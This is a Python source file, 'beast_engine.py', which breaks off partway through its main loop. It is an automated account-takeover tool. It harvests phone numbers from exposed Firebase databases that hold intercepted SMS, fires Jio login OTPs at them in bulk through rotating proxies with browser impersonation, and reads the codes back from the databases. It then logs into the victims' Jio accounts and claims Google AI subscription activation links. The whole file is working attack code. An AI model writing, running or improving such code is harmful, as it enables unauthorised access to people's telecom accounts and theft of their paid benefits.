"""
beast_engine.py — WAVE BEAST ENGINE v12 (NUCLEAR WAVE EDITION)
==============================================================
Architecture:
  WAVE CYCLE (per panel batch):
    1. Extract N numbers from panel (all at once)
    2. Send ALL OTPs simultaneously via parallel proxy dispatch
    3. Listen to ALL Firebase SSE streams in parallel (15s window)
    4. Claim any OTPs that arrive — link saved to Desktop
    5. Log EVERYTHING (wave_logs/wave_YYYYMMDD_HHMMSS.jsonl)
    6. Mark all numbers dead, advance to next panel/wave

  BACKGROUND:
    - Dorker: continuously finds new Firebase panels (24/7)
    - Scanner: pre-scans panels to pre-fill number pool
    - Panel Lifecycle: active → exhausted → used_panels/ archive

  COMBO MODE (option 1): Dorker + Wave Beast, always-on, 24/7.
"""
from __future__ import annotations

import asyncio
import csv
import html
import json
import os
import random
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import aiohttp
import aiofiles
from curl_cffi.requests import AsyncSession as CurlAsyncSession

if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from number_utils import ACTIVATION_PATTERN, is_garbage, normalize_mobile
import panel_scores as _pscores
from otp_shared import async_claim_with_lock, async_release_lock, async_register_live_phone
from otp_poller import stream_firebase_for_otp, poll_firebase_for_otp, pre_probe_device_inbox
from firebase_scanner import generate_candidates, dorker_check, extract_panel_numbers
from dashboard import build_dashboard_table, print_fallback_status, _RICH

if _RICH:
    from rich.live import Live
    from rich.console import Console
    _console = Console()
else:
    _console = None

# ==================== CONFIG ====================
CONFIG_FILE = Path("config.json")
def _load_cfg() -> dict[str, Any]:
    try:
        return json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}

_CFG = _load_cfg()
_t   = _CFG.get("threads", {})
_to  = _CFG.get("timeouts", {})
_out = _CFG.get("output", {})
_ret = _CFG.get("retry", {})
_wav = _CFG.get("wave", {})

# === WAVE CONFIG ===
WAVE_TIMEOUT:    float = float(_wav.get("wave_timeout_seconds", 15.0))   # seconds per wave
WAVE_BATCH_SIZE: int   = int(_wav.get("wave_batch_size", 80))            # numbers per wave
WAVE_OTP_WORKERS: int  = int(_wav.get("wave_otp_workers", 80))           # parallel OTP senders
PANEL_EXHAUST_WAVES: int = int(_wav.get("panel_exhaust_waves", 3))       # waves before marking exhausted

# === WORKER POOLS ===
SCANNER_WORKERS      = int(_t.get("scanner_workers", 20))
OTP_DISPATCH_WORKERS = int(_t.get("otp_workers", 150))
LINK_WORKERS         = int(_t.get("claim_workers", 12))
CONCURRENT_DORKER    = int(_t.get("panel_scan_workers", 10))

# === TIMEOUTS ===
FIREBASE_TIMEOUT: float = float(_to.get("firebase_request_timeout", 4.0))
JIO_TIMEOUT:      float = float(_to.get("jio_api_timeout", 8.0))
OTP_TIMEOUT:      float = float(_to.get("otp_timeout_seconds", 60))

# === PATHS ===
LOCAL_LINKS     = Path(_out.get("links_file", "gemini_activation_links.txt"))
LOCAL_REDEEMED  = Path("used_links.txt")
def _resolve_desktop() -> Path:
    for cand in [Path.home() / "OneDrive" / "Desktop", Path.home() / "Desktop"]:
        if cand.exists():
            return cand
    return Path.home() / "Desktop"
DESKTOP         = _resolve_desktop()
DESKTOP_FRESH   = DESKTOP / "fresh_links.txt"
DESKTOP_ALL     = DESKTOP / "gemini_activation_links.txt"
RESULTS_CSV     = Path(_out.get("results_csv", "gemini_results.csv"))
DISCOVERED_FILE = Path("discovered_panels.txt")
DEAD_FILE       = Path(_out.get("dead_panels_file", "dead_panels.txt"))
PROXIES_FILE    = Path("proxies.txt")
WAVE_LOGS_DIR   = Path("wave_logs")
USED_PANELS_DIR = Path("used_panels")

# === JIO ENDPOINTS ===
CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL   = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL       = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL   = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL   = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL     = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL     = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE    = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

# ==================== IP SLOT MANAGER ====================
class IPSlotManager:
    """Each unique IP gets ONE slot token. Workers acquire/release exclusively."""

    _BACKOFF_TABLE = [5.0, 15.0, 30.0, 60.0]  # exponential backoff by failure count

    def __init__(self, proxies_file: "Path | None" = None):
        self._slots: asyncio.Queue | None = None
        self._host_proxy: dict[str, str | None] = {}  # label -> proxy_url (None for direct)
        self._failures: dict[str, int] = {}
        self._cooldowns: dict[str, float] = {}
        self.total_ips: int = 0
        self._direct_slots: int = 15
        self._proxies_file: Path = proxies_file if proxies_file is not None else PROXIES_FILE

    def init_slots(self, direct_slots: "int | None" = None):
        if direct_slots is not None:
            self._direct_slots = direct_slots
        proxies = []
        if self._proxies_file.exists():
            for line in self._proxies_file.read_text(encoding="utf-8", errors="ignore").splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    host, port, user, pw = parts
                    proxy_url = f"http://{user}:{pw}@{host}:{port}"
                    label = f"{host}:{port}"
                    self._host_proxy[label] = proxy_url
                    proxies.append(label)
                elif len(parts) == 2:
                    host, port = parts
                    proxy_url = f"http://{host}:{port}"
                    label = f"{host}:{port}"
                    self._host_proxy[label] = proxy_url
                    proxies.append(label)

        self._slots = asyncio.Queue()
        for label in proxies:
            self._slots.put_nowait(label)
        # All direct slots share the label "direct"; proxy is None (no proxy)
        self._host_proxy["direct"] = None
        for _ in range(self._direct_slots):
            self._slots.put_nowait("direct")
        self.total_ips = len(proxies) + self._direct_slots

    async def acquire(self) -> "tuple[str | None, str]":
        """Block until a slot is free. Returns (proxy_url_or_None, label)."""
        while True:
            label = await self._slots.get()
            cooldown_until = self._cooldowns.get(label, 0)
            if time.monotonic() < cooldown_until:
                await self._slots.put(label)
                await asyncio.sleep(0.05)
                continue
            proxy = self._host_proxy.get(label)  # None for direct slots
            return proxy, label

    async def release(self, arg1, arg2=0.0, *, cooldown: float = 0.0):
        """
        Dual-mode release to support both calling conventions:
          release(label)                    — legacy: arg1=label str, no cooldown
          release(label, cooldown=X)        — legacy: arg1=label str, arg2/cooldown=float
          release(proxy, label)             — new: arg1=proxy (str|None), arg2=label str
        """
        if isinstance(arg2, str):
            # New API: release(proxy, label)
            actual_label: str = arg2
            actual_cooldown: float = cooldown
        else:
            # Legacy API: release(label) or release(label, cooldown_value)
            actual_label = arg1
            actual_cooldown = float(arg2) if arg2 else cooldown
        if actual_cooldown > 0:
            self._cooldowns[actual_label] = time.monotonic() + actual_cooldown
        await self._slots.put(actual_label)

    def record_success(self, label: str):
        """Partial recovery: decrement failure counter by 1, remove key when it reaches 0."""
        n = self._failures.get(label, 0)
        if n > 1:
            self._failures[label] = n - 1
        else:
            self._failures.pop(label, None)

    def record_failure(self, label: str) -> float:
        """Record a failure and return exponential backoff duration in seconds."""
        n = self._failures.get(label, 0) + 1
        self._failures[label] = n
        return self._BACKOFF_TABLE[min(n - 1, len(self._BACKOFF_TABLE) - 1)]

_ip_manager = IPSlotManager()

# ==================== GLOBAL STATE ====================
_seen_panels:    set[str]   = set()
_dead_panels:    set[str]   = set()
_live_panels:    set[str]   = set()
_exhausted_panels: set[str] = set()
_claimed_mobiles: set[str]  = set()
_known_links:    set[str]   = set()
_claimed_links:  list[str]  = []
_fresh_links:    list[str]  = []
_lock           = asyncio.Lock()
_file_lock      = asyncio.Lock()

_dead_numbers_ttl: dict[str, float] = {}

# Panels that produced 0 claims in 2+ consecutive waves are cooled down for 20 mins
_panel_claim_cooldown: dict[str, float] = {}   # panel_url → cooldown_expires_at
_panel_zero_claim_streak: dict[str, int] = {}  # panel_url → consecutive zero-claim wave count
_PANEL_COOLDOWN_SECS = 20 * 60                # 20 minutes (was 6h; 20m allows new SMS/victims to arrive without stalling the engine)
_PANEL_COOLDOWN_THRESHOLD = 2                  # trigger after N consecutive zero-claim waves

# === Global atomic wave counter (shared across all wave_beast_loop runners) ===
_global_wave_num: int = 0
_wave_num_lock: asyncio.Lock = asyncio.Lock()

async def _next_wave_num() -> int:
    global _global_wave_num
    async with _wave_num_lock:
        _global_wave_num += 1
        return _global_wave_num

def is_number_dead(mob: str) -> bool:
    return time.time() < _dead_numbers_ttl.get(mob, 0)

def mark_number_dead(mob: str, ttl: float = 300.0):
    _dead_numbers_ttl[mob] = time.time() + ttl

# Wave stats
_stats = {
    "panels_probed": 0, "panels_live": 0, "panels_exhausted": 0,
    "panels_discovered": 0,
    "numbers_found": 0, "waves_run": 0, "otps_sent": 0,
    "not_jio": 0, "locked": 0, "otp_received": 0,
    "otp_send_fail": 0,
    "otp_timeout": 0, "links_claimed": 0, "links_fresh": 0,
    "start_time": time.time(), "current_wave": "",
    "last_wave_sent": 0, "last_wave_claimed": 0,
}

def _inc(key: str, n: int = 1):
    _stats[key] = _stats.get(key, 0) + n

# ==================== JIO HEADERS ====================
_JIO_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-IN,en;q=0.9,hi;q=0.8",
    "Content-Type": "application/json",
    "Origin": "https://www.jio.com",
    "Referer": "https://www.jio.com/selfcare/",
    "Connection": "keep-alive",
}

# ==================== STATE INIT ====================
def load_state():
    if RESULTS_CSV.exists():
        try:
            with RESULTS_CSV.open("r", encoding="utf-8", errors="ignore") as f:
                for row in csv.DictReader(f):
                    status = str(row.get("status", "")).lower()
                    if "found" in status or "claim" in status or "active" in status:
                        m = row.get("mobile_number") or row.get("mobile")
                        if m:
                            _claimed_mobiles.add(m)
        except Exception:
            pass
    for lf in (LOCAL_LINKS, DESKTOP_ALL, DESKTOP_FRESH, LOCAL_REDEEMED):
        try:
            if lf.exists():
                for line in lf.read_text(encoding="utf-8", errors="ignore").splitlines():
                    line = line.strip()
                    if line.startswith("http"):
                        _known_links.add(line)
        except Exception:
            pass

def load_seed_panels() -> list[tuple[str, str]]:
    panels: list[tuple[str, str]] = []
    seen: set[str] = set()
    for fname in ["fresh_panels.txt", "discovered_panels.txt", "working_panels.txt", "panels.txt", "intl_panels_found.txt"]:
        fp = Path(fname)
        if not fp.exists():
            continue
        for line in fp.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            url = ""
            key = ""
            if "|" in line:
                parts = line.split("|")
                raw_url = parts[0].strip()
                for p in parts[1:]:
                    p = p.strip()
                    if p and not any(x in p for x in ("=", " ", ":")) and len(p) > 10:
                        key = p
                        break
                url = raw_url.split("?")[0].rstrip("/")
            elif "?auth=" in line:
                url, _, key_candidate = line.partition("?auth=")
                key_candidate = key_candidate.split("&")[0].strip()
                if len(key_candidate) > 10:
                    key = key_candidate
                url = url.rstrip("/")
            else:
                url = line.split("?")[0].rstrip("/")
            if url and url.startswith("http") and url not in seen:
                seen.add(url)
                panels.append((url, key))

    lp = Path("live_phones.txt")
    if lp.exists():
        for line in lp.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if "|" in line:
                parts = line.split("|")
                if len(parts) >= 2:
                    p_url = parts[1].strip()
                    p_key = parts[2].strip() if len(parts) >= 3 else ""
                    if p_url.startswith("http") and p_url not in seen:
                        seen.add(p_url)
                        panels.append((p_url, p_key))

    ps = Path("panel_scores.json")
    if ps.exists():
        try:
            scores_data = json.loads(ps.read_text(encoding="utf-8"))
            if isinstance(scores_data, dict):
                for p_url in scores_data.keys():
                    p_clean = p_url.split("?")[0].rstrip("/")
                    if p_clean.startswith("http") and p_clean not in seen:
                        seen.add(p_clean)
                        panels.append((p_clean, ""))
        except Exception:
            pass

    # Exclude already-exhausted and dead panels
    panels = [(u, k) for u, k in panels if u not in _exhausted_panels and u not in _dead_panels]
    return panels

# ==================== WAVE LOGGER ====================
class WaveLogger:
    """Detailed per-wave JSONL logger. Every number, every result, every timing."""
    def __init__(self):
        WAVE_LOGS_DIR.mkdir(exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = WAVE_LOGS_DIR / f"wave_{ts}.jsonl"
        self._buf: list[dict] = []
        self._wave_num = 0

    def wave_start(self, panel: str, numbers: list, wave_num: int) -> dict:
        self._wave_num = wave_num
        record = {
            "type": "wave_start",
            "wave": wave_num,
            "panel": panel,
            "numbers_count": len(numbers),
            "numbers": [n[0] if isinstance(n, (list, tuple)) else n for n in numbers],
            "ts": datetime.now().isoformat(),
            "epoch": time.time(),
        }
        self._buf.append(record)
        return record

    def otp_sent(self, wave: int, mobile: str, status: str, proxy: str, elapsed_ms: float):
        self._buf.append({
            "type": "otp_sent",
            "wave": wave,
            "mobile": mobile,
            "status": status,
            "proxy": proxy.split("@")[-1] if "@" in proxy else proxy[:20],
            "elapsed_ms": round(elapsed_ms, 1),
            "ts": datetime.now().isoformat(),
        })

    def otp_received(self, wave: int, mobile: str, otp: str, elapsed_ms: float, panel: str):
        self._buf.append({
            "type": "otp_received",
            "wave": wave,
            "mobile": mobile,
            "otp": otp,
            "elapsed_ms": round(elapsed_ms, 1),
            "panel": panel,
            "ts": datetime.now().isoformat(),
        })

    def claim_result(self, wave: int, mobile: str, status: str, link: str, elapsed_ms: float):
        self._buf.append({
            "type": "claim_result",
            "wave": wave,
            "mobile": mobile,
            "status": status,
            "link": link[:80] if link else "",
            "elapsed_ms": round(elapsed_ms, 1),
            "ts": datetime.now().isoformat(),
        })

    def wave_end(self, wave: int, panel: str, sent: int, received: int, claimed: int, elapsed_s: float,
                 not_jio: int, locked: int, timeout: int, send_fail: int):
        record = {
            "type": "wave_end",
            "wave": wave,
            "panel": panel,
            "sent": sent,
            "received": received,
            "claimed": claimed,
            "elapsed_s": round(elapsed_s, 2),
            "not_jio": not_jio,
            "locked": locked,
            "otp_timeout": timeout,
            "send_fail": send_fail,
            "success_rate_pct": round(100 * claimed / sent, 1) if sent > 0 else 0,
            "otp_rate_pct": round(100 * received / sent, 1) if sent > 0 else 0,
            "ts": datetime.now().isoformat(),
        }
        self._buf.append(record)
        # Note: actual flush is done by the async caller via await _wave_logger.flush_now()
        return record

    async def _flush(self):
        if not self._buf:
            return
        to_write = self._buf[:]
        self._buf.clear()
        try:
            async with aiofiles.open(self.log_file, "a", encoding="utf-8") as f:
                for rec in to_write:
                    await f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        except Exception:
            pass

    async def flush_now(self):
        await self._flush()

_wave_logger = WaveLogger()

# ==================== PANEL LIFECYCLE MANAGER ====================
class PanelLifecycleManager:
    """Tracks panel state and archives exhausted panels."""
    def __init__(self):
        USED_PANELS_DIR.mkdir(exist_ok=True)
        self._wave_counts: dict[str, int] = {}
        self._number_counts: dict[str, int] = {}
        self._archive_file = USED_PANELS_DIR / f"archived_{datetime.now().strftime('%Y%m%d')}.txt"

    def record_wave(self, panel: str, numbers_found: int) -> bool:
        """Returns True if panel should be archived (exhausted)."""
        self._wave_counts[panel] = self._wave_counts.get(panel, 0) + 1
        self._number_counts[panel] = self._number_counts.get(panel, 0) + numbers_found
        # Exhaust if we've run enough waves with no numbers OR total numbers is very low
        waves = self._wave_counts[panel]
        total = self._number_counts[panel]
        if waves >= PANEL_EXHAUST_WAVES and total < 5:
            return True  # exhausted
        return False

    async def archive_panel(self, panel: str):
        """Move panel to used_panels/ so it's not used again soon."""
        _exhausted_panels.add(panel)
        _inc("panels_exhausted")
        try:
            async with aiofiles.open(self._archive_file, "a", encoding="utf-8") as f:
                await f.write(f"{panel}|archived={datetime.now().isoformat()}\n")
        except Exception:
            pass
        # Also append to dead_panels.txt so dorker skips it
        try:
            async with aiofiles.open(DEAD_FILE, "a", encoding="utf-8") as f:
                await f.write(f"{panel}\n")
        except Exception:
            pass

    def get_panel_stats(self, panel: str) -> dict:
        return {
            "waves": self._wave_counts.get(panel, 0),
            "total_numbers": self._number_counts.get(panel, 0),
        }

_panel_lifecycle = PanelLifecycleManager()

# ==================== OTP SEND (SLOT-BASED) ====================
async def send_otp_for_number(mobile: str) -> tuple[str, Any, str]:
    """
    Acquire IP slot → send OTP → release slot.
    Returns (status, curl_session, proxy_label)
    """
    proxy_url, label = await _ip_manager.acquire()
    curl_s = CurlAsyncSession(impersonate="chrome124")
    t0 = time.monotonic()
    try:
        resp = await curl_s.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            headers=_JIO_HEADERS,
            proxy=proxy_url if proxy_url else None,
            timeout=5.0
        )
        try:
            data = resp.json()
        except Exception:
            data = {}

        if resp.status_code == 200:
            resp_msg = str(data.get("responseMessage", "")).upper()
            if resp_msg == "SUCCESS" or (data and not data.get("errorMessage")):
                status = str(data.get("status", "")).lower()
                if status not in ("failed", "error", "false"):
                    _ip_manager.record_success(label)
                    await _ip_manager.release(label, cooldown=2.5)
                    return "success", curl_s, proxy_url or ""
            err = str(data.get("errorMessage", "")).upper()
            if any(x in err for x in ("INVALID", "NOT", "SUBSCRIBED")):
                await curl_s.close()
                _ip_manager.record_success(label)
                await _ip_manager.release(label)
                return "not_jio", None, ""
            _ip_manager.record_success(label)
            await _ip_manager.release(label, cooldown=2.5)
            return "success", curl_s, proxy_url or ""

        elif resp.status_code in (400, 429):
            err = (str(data.get("errorMessage", "")) + " " + str(data.get("errorCode", ""))).upper()
            if any(x in err for x in ("INVALID_JIONUMBER", "NOT_SUBSCRIBED", "NOT A VALID JIO", "INVALID")):
                await curl_s.close()
                _ip_manager.record_success(label)
                await _ip_manager.release(label)
                return "not_jio", None, ""
            if "SEND_OTP_CURRENTLY_LOCKED" in err:
                await curl_s.close()
                _ip_manager.record_success(label)
                await _ip_manager.release(label)
                return "locked", None, ""
            if "CAPTCHA" in err or resp.status_code == 429:
                await curl_s.close()
                cooldown = max(20.0, _ip_manager.record_failure(label))
                await _ip_manager.release(label, cooldown=cooldown)
                return "captcha", None, ""

        await curl_s.close()
        cooldown = _ip_manager.record_failure(label)
        await _ip_manager.release(label, cooldown=cooldown)
    except Exception:
        cooldown = _ip_manager.record_failure(label)
        await _ip_manager.release(label, cooldown=cooldown)
        try:
            await curl_s.close()
        except Exception:
            pass

    return "failed", None, ""

# ==================== CLAIM FLOW ====================
async def _do_verify_and_claim(curl_s: Any, mobile: str, otp: str, proxy: str | None) -> tuple[str, str]:
    dash_h  = {**_JIO_HEADERS, "Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_h = {**_JIO_HEADERS, "Accept": "*/*", "Referer": GOOGLE_PAGE}

    resp = await curl_s.post(
        VERIFY_OTP_URL,
        json={"mobileNumber": mobile, "otp": otp},
        headers=_JIO_HEADERS,
        proxy=proxy,
        timeout=JIO_TIMEOUT
    )
    if resp.status_code != 200:
        return "verify_failed", ""
    vdata = resp.json()
    if not vdata or vdata.get("errorMessage"):
        return "verify_failed", ""

    ar = await curl_s.get(AUTH_URL, headers=dash_h, proxy=proxy, timeout=10)
    if ar.status_code == 200:
        adata = ar.json()
        if str(adata.get("loginFlag", "")).lower() != "true":
            return "not_logged_in", ""

    try:
        await curl_s.get(NAVIGATE_URL, headers=dash_h, proxy=proxy, timeout=8)
    except Exception:
        pass

    try:
        act_resp = await curl_s.get(ACTIVATE_URL, headers=offer_h, proxy=proxy, timeout=10)
        if act_resp.status_code == 200:
            ad = act_resp.json()
            ad_err = str(ad.get("errorMessage", "")).lower()
            ad_msg = str(ad.get("responseMessage", "")).lower()
            if any(w in ad_err for w in ("already", "claimed", "active", "redeemed", "expired")) or "already" in ad_msg:
                return "already_active", ""
    except Exception:
        pass

    gr = None
    for _google_attempt in range(3):
        try:
            gr = await curl_s.get(GOOGLE_URL, headers=offer_h, proxy=proxy, timeout=10)
            if gr.status_code == 200:
                break
        except Exception:
            gr = None
        if _google_attempt < 2:
            await asyncio.sleep(1.0)
    if gr is None or gr.status_code != 200:
        return "google_failed", ""
    gd = gr.json()
    err_text = (str(gd.get("errorMessage", "")) + " " + str(gd.get("responseMessage", ""))).lower()
    if any(w in err_text for w in ("already", "claimed", "active", "redeemed", "expired")):
        return "already_active", ""

    redir = str(gd.get("redirectionURL", ""))
    decoded = unquote(html.unescape(redir))
    match = ACTIVATION_PATTERN.search(decoded)
    if match:
        link = f"https://serviceactivation.google.com/subscription/new/{match.group('token')}{match.group('padding')}"
        try:
            await curl_s.get(SUBMIT_URL, headers=offer_h, proxy=proxy, timeout=5)
        except Exception:
            pass
        return "found", link
    return "no_url", ""

# ==================== WAVE OTP LISTENER ====================
async def wave_otp_listener(
    session: aiohttp.ClientSession,
    mobile: str,
    base_url: str,
    key: str,
    device_id: str,
    verified_path: str,
    curl_s: Any,
    proxy: str,
    wave_timeout: float,
    send_time: float,
    wave_num: int,
    result_queue: asyncio.Queue,
):
    """
    Per-number SSE listener for a wave window.
    Waits up to wave_timeout for OTP, then gives up.
    Puts result into result_queue: (mobile, status, link).
    """
    t0 = time.monotonic()
    tried_otps: set[str] = set()
    status = "otp_timeout"
    link = ""
    otp = None

    try:
        otp = await poll_firebase_for_otp(
            session, base_url, key, device_id, mobile,
            timeout=wave_timeout,
            known_path=verified_path or None,
            pre_existing_keys=None,
            send_time=send_time,
            exclude_otps=tried_otps,
        )
    except Exception:
        otp = None

    if otp:
        elapsed_ms = (time.monotonic() - t0) * 1000
        _wave_logger.otp_received(wave_num, mobile, otp, elapsed_ms, base_url)
        tried_otps.add(otp)
        _inc("otp_received")
        # Claim it
        try:
            status, link = await _do_verify_and_claim(curl_s, mobile, otp, proxy if proxy else None)
        except Exception:
            status = "claim_error"
            link = ""
        elapsed_claim = (time.monotonic() - t0) * 1000
        _wave_logger.claim_result(wave_num, mobile, status, link, elapsed_claim)
    else:
        _inc("otp_timeout")

    try:
        result_queue.put_nowait((mobile, status, link))
    except Exception:
        pass

    try:
        await async_release_lock(mobile)
    except Exception:
        pass
    if curl_s:
        try:
            await curl_s.close()
        except Exception:
            pass

# ==================== WAVE DISPATCHER ====================
async def run_wave(
    session: aiohttp.ClientSession,
    connector: aiohttp.TCPConnector,
    panel_url: str,
    panel_key: str,
    numbers: list[tuple[str, str, str]],  # (mobile, device_id, verified_path)
    wave_num: int,
) -> dict:
    """
    Core wave: send ALL OTPs simultaneously, listen for all simultaneously, collect results.
    Returns wave summary dict.
    """
    wave_start_t = time.monotonic()
    _stats["current_wave"] = f"Wave #{wave_num} | {panel_url.split('//')[1].split('.')[0][:20]} | {len(numbers)} nums"
    _stats["waves_run"] = wave_num

    # Filter already claimed/dead
    clean = []
    for mob, dev_id, vpath in numbers:
        if mob in _claimed_mobiles or is_number_dead(mob):
            continue
        if not await async_claim_with_lock(mob):
            continue
        clean.append((mob, dev_id, vpath))

    if not clean:
        return {"sent": 0, "received": 0, "claimed": 0, "not_jio": 0, "locked": 0,
                "otp_timeout": 0, "send_fail": 0}

    _wave_logger.wave_start(panel_url, clean, wave_num)
    print(f"\n[WAVE #{wave_num}] 📡 {panel_url.split('//')[-1].split('.')[0][:25]} | {len(clean)} numbers → sending ALL OTPs NOW...")

    # === PHASE 1: Send ALL OTPs simultaneously ===
    send_start = time.monotonic()

    async def _send_one(mob: str, dev_id: str, vpath: str):
        t0 = time.monotonic()
        status, curl_s, proxy = await send_otp_for_number(mob)
        elapsed_ms = (time.monotonic() - t0) * 1000
        _wave_logger.otp_sent(wave_num, mob, status, proxy, elapsed_ms)
        return mob, dev_id, vpath, status, curl_s, proxy

    # Limit concurrent OTP senders to WAVE_OTP_WORKERS
    sem = asyncio.Semaphore(WAVE_OTP_WORKERS)
    async def _throttled_send(mob, dev_id, vpath):
        async with sem:
            return await _send_one(mob, dev_id, vpath)

    send_tasks = [asyncio.create_task(_throttled_send(mob, dev_id, vpath)) for mob, dev_id, vpath in clean]
    send_results = await asyncio.gather(*send_tasks, return_exceptions=True)

    send_elapsed = time.monotonic() - send_start
    sent_ok: list[tuple[str, str, str, Any, str]] = []  # (mobile, dev_id, vpath, curl_s, proxy)
    not_jio = 0
    locked = 0
    send_fail = 0

    for res in send_results:
        if isinstance(res, Exception):
            send_fail += 1
            continue
        mob, dev_id, vpath, status, curl_s, proxy = res
        if status == "success":
            sent_ok.append((mob, dev_id, vpath, curl_s, proxy))
            _inc("otps_sent")
        elif status == "not_jio":
            not_jio += 1
            _inc("not_jio")
            mark_number_dead(mob, 3600.0)
            await async_release_lock(mob)
        elif status == "locked":
            locked += 1
            _inc("locked")
            await async_release_lock(mob)
        else:
            send_fail += 1
            _inc("otp_send_fail")
            await async_release_lock(mob)

    sent_count = len(sent_ok)
    _stats["last_wave_sent"] = sent_count
    print(f"[WAVE #{wave_num}] ✅ Sent {sent_count} OTPs in {send_elapsed:.1f}s | "
          f"Not Jio: {not_jio} | Locked: {locked} | Fail: {send_fail} → now listening {WAVE_TIMEOUT:.0f}s...")

    if sent_count == 0:
        return {"sent": 0, "received": 0, "claimed": 0, "not_jio": not_jio, "locked": locked,
                "otp_timeout": 0, "send_fail": send_fail}

    # === PHASE 2: Listen for ALL OTPs simultaneously (wave timeout window) ===
    send_time = time.time()
    result_queue: asyncio.Queue = asyncio.Queue()

    listen_tasks = []
    for mob, dev_id, vpath, curl_s, proxy in sent_ok:
        task = asyncio.create_task(wave_otp_listener(
            session=session,
            mobile=mob,
            base_url=panel_url,
            key=panel_key,
            device_id=dev_id,
            verified_path=vpath,
            curl_s=curl_s,
            proxy=proxy,
            wave_timeout=WAVE_TIMEOUT + 5,  # +5s buffer for SSE connect + initial PUT parse
            send_time=send_time,
            wave_num=wave_num,
            result_queue=result_queue,
        ))
        listen_tasks.append(task)

    # Wait for all listeners to finish (they each self-terminate at wave_timeout)
    await asyncio.gather(*listen_tasks, return_exceptions=True)

    # === PHASE 3: Collect results ===
    received = 0
    claimed = 0
    otp_timeout = 0
    fresh_links: list[str] = []

    while not result_queue.empty():
        mob, status, link = result_queue.get_nowait()
        if status == "found" and link:
            claimed += 1
            received += 1
            fresh_links.append(link)
            _claimed_mobiles.add(mob)
            _inc("links_claimed")
            _pscores.record_claim(panel_url)
            print(f"[WAVE #{wave_num}] 🎉 CLAIMED: {mob} → {link[:60]}...")
        elif status in ("already_active", "verify_failed", "not_logged_in", "claim_error", "no_url", "google_failed"):
            if status not in ("otp_timeout",):
                received += 1  # at least OTP was received
            if status == "already_active":
                _claimed_mobiles.add(mob)  # don't re-queue — already active, no point retrying
        elif status == "otp_timeout":
            otp_timeout += 1
        else:
            received += 1

    _stats["last_wave_claimed"] = claimed

    # Save fresh links
    if fresh_links:
        await _save_links(fresh_links)

    wave_elapsed = time.monotonic() - wave_start_t
    wave_summary = _wave_logger.wave_end(
        wave_num, panel_url, sent_count, received, claimed, wave_elapsed,
        not_jio, locked, otp_timeout, send_fail
    )

    # Diagnostic: if 0 OTPs received from many sent → flag panel as suspicious
    if sent_count >= 5 and received == 0:
        print(f"[WAVE #{wave_num}] ⚠️  0 OTPs received from {sent_count} sent! "
              f"Panel may be dead or SIM extraction wrong. Check wave_logs/")

    print(f"[WAVE #{wave_num}] 📊 Done in {wave_elapsed:.1f}s | "
          f"Sent:{sent_count} OTP✓:{received} Claimed:{claimed} Timeout:{otp_timeout}")

    return wave_summary

# ==================== LINK SAVER ====================
async def _save_links(links: list[str]):
    for link in links:
        if link in _known_links:
            continue
        _known_links.add(link)
        _claimed_links.append(link)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"{link}    # saved {timestamp}\n"
        wrote_any = False
        for fpath in (DESKTOP_FRESH, LOCAL_LINKS):
            try:
                async with aiofiles.open(fpath, "a", encoding="utf-8") as f:
                    await f.write(line)
                wrote_any = True
            except Exception:
                pass
        if wrote_any:
            _inc("links_fresh")  # count once per unique link, not once per file

# ==================== WAVE BEAST MAIN LOOP ====================
async def wave_beast_loop(
    session: aiohttp.ClientSession,
    connector: aiohttp.TCPConnector,
    panel_queue: asyncio.Queue,
):
    """
    Main wave loop: picks panels from queue, extracts numbers, runs waves.
    Runs forever, continuously cycling through panels.
    """
    scan_sem = asyncio.Semaphore(4)  # limit concurrent panel scans

    while True:
        # Get next panel to process
        try:
            panel_url, panel_key = await asyncio.wait_for(panel_queue.get(), timeout=5.0)
        except asyncio.TimeoutError:
            await asyncio.sleep(1.0)
            continue

        if panel_url in _exhausted_panels or panel_url in _dead_panels:
            panel_queue.task_done()
            continue

        # Skip panels that are in claim cooldown (burned, resting for 6h)
        cooldown_until = _panel_claim_cooldown.get(panel_url, 0)
        if time.time() < cooldown_until:
            panel_queue.task_done()
            remaining = int((cooldown_until - time.time()) / 60)
            # Quietly skip; rare print to avoid log spam
            continue

        # Extract numbers from panel
        try:
            async with scan_sem:
                num_list, dev_count = await extract_panel_numbers(
                    session, panel_url, panel_key, timeout=max(FIREBASE_TIMEOUT, 8.0)
                )
        except Exception:
            num_list = []
            dev_count = 0

        panel_queue.task_done()

        if not num_list:
            # No numbers → record for lifecycle check
            should_exhaust = _panel_lifecycle.record_wave(panel_url, 0)
            if should_exhaust:
                await _panel_lifecycle.archive_panel(panel_url)
